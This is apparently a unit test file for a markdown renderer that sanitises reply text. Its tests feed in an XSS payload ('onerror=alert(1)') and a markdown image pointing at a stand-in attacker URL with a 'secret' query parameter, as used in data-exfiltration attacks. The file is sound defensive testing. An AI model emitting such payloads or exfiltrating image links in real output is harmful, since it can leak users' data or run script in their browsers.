import { renderReplyMarkdown } from './markdown';

describe('renderReplyMarkdown', () => {
    it('renders basic markdown to HTML', () => {
        expect(renderReplyMarkdown('**bold**')).toContain('<strong>bold</strong>');
    });

    it('escapes raw HTML rather than injecting it', () => {
        const html = renderReplyMarkdown('<img src=x onerror=alert(1)>');
        expect(html).not.toContain('<img');
        expect(html).toContain('&lt;img');
    });

    it('renders a markdown image as a link instead of an <img>', () => {
        const html = renderReplyMarkdown('![Photo](https://evil.example/leak?d=secret)');

        expect(html).not.toContain('<img');
        expect(html).toContain(
            '<a href="https://evil.example/leak?d=secret" target="_blank" rel="noopener noreferrer">Photo</a>'
        );
    });

    it('labels an image link with no alt text', () => {
        expect(renderReplyMarkdown('![](https://example.com/a.png)')).toContain('>Image</a>');
    });

    it('opens links in a new tab without leaking the opener or referrer', () => {
        expect(renderReplyMarkdown('[a](https://example.com) https://example.org')).toBe(
            '<p><a href="https://example.com" target="_blank" rel="noopener noreferrer">a</a> ' +
                '<a href="https://example.org" target="_blank" rel="noopener noreferrer">https://example.org</a></p>\n'
        );
    });

    it('turns single newlines into <br> (breaks: true)', () => {
        expect(renderReplyMarkdown('a\nb')).toContain('<br>');
    });
});
